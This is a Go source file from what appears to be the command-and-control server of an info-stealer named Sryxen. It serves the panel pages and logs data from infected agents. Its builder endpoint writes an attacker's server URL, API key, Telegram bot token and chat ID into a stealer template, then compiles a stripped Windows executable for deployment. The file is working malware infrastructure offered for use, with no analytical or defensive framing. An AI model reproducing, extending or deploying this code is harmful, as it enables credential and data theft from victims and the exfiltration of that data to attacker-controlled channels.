package Router

import (
	"SryxenStealerC2/AgentHandler"
	"net/http"
    "io/ioutil"
	"os/exec"
	"path/filepath"

	"fmt"
	"strings"
	"github.com/gorilla/mux"
)

func ServeHTMLFiles(w http.ResponseWriter, r *http.Request) {
	switch r.URL.Path {
	case "/":
		http.ServeFile(w, r, "public/home.html")
	case "/clients":
		http.ServeFile(w, r, "public/clients.html")
		case "/builder":
		http.ServeFile(w, r, "public/builder.html")
	default:
		http.NotFound(w, r)
	}
}

func ServeStaticFiles(r *mux.Router) {
	r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("public/static"))))
	r.PathPrefix("/images/").Handler(http.StripPrefix("/images/", http.FileServer(http.Dir("public/images"))))
}

func HandleLogAgent(w http.ResponseWriter, r *http.Request) {
	AgentHandler.LogAgentData(w, r)
}

func AddBuilderHandler(r *mux.Router) {
    r.HandleFunc("/generate-payload", HandleBuilderForm).Methods("POST")
}

func HandleBuilderForm(w http.ResponseWriter, r *http.Request) {
    err := r.ParseForm()
    if err != nil {
        http.Error(w, "Invalid form data", http.StatusBadRequest)
        return
    }

    serverURL := r.FormValue("url")
    apiKey := r.FormValue("apiKey")
    botToken := r.FormValue("botToken")
    chatID := r.FormValue("chatID")

    if serverURL == "" || apiKey == "" || botToken == "" || chatID == "" {
        http.Error(w, "Missing required fields", http.StatusBadRequest)
        return
    }

    if err := GeneratePayload(serverURL, apiKey, botToken, chatID); err != nil {
        http.Error(w, "Failed to generate payload: "+err.Error(), http.StatusInternalServerError)
        return
    }

    w.WriteHeader(http.StatusOK)
    w.Write([]byte("Payload generated successfully! please check folder called client-stealer theres a payload called sryxen-built.exe which is yours."))
}


func GeneratePayload(serverURL, apiKey, botToken, chatID string) error {
    templateContent, err := ioutil.ReadFile("client-stealer/template.go")
    if err != nil {
        return fmt.Errorf("failed to read template: %v", err)
    }

    result := strings.ReplaceAll(string(templateContent), "%SERVER_URL_HERE%", serverURL)
    result = strings.ReplaceAll(result, "%SRYXEN_API_KEY_GENERATED%", apiKey)
    result = strings.ReplaceAll(result, "%YOUR_BOT_TOKEN%", botToken)
    result = strings.ReplaceAll(result, "%YOUR_CHAT_ID%", chatID)

    if err := ioutil.WriteFile("client-stealer/sryxen_payload.go", []byte(result), 0644); err != nil {
        return fmt.Errorf("failed to write payload: %v", err)
    }

    clientStealerDir, err := filepath.Abs("client-stealer")
    if err != nil {
        return fmt.Errorf("failed to get absolute path of client-stealer directory: %v", err)
    }

    cmd := exec.Command("go", "build", "-trimpath", "-buildvcs=false", "-ldflags", "-s -w -buildid=", "-gcflags", "all=-l", "-o", "sryxen-built.exe", "sryxen_payload.go")
    cmd.Dir = clientStealerDir

    output, err := cmd.CombinedOutput()
    if err != nil {
        return fmt.Errorf("failed to build payload: %v, output: %s", err, output)
    }

    fmt.Println("Build successful, executable created: sryxen-built.exe")
    return nil
}
